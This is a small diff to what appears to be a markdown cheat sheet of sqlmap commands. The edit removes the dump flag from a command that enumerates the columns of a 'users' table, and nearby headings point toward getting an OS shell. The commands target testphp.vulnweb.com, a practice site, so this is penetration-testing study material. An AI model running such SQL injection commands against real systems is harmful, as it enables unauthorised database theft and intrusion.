@@ -60,7 +60,7 @@ sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -
 ```
 ## columns
 ```
-sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dump -D testdb -T users --columns
+sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D testdb -T users --columns
 ```
 ### os shell
 ```
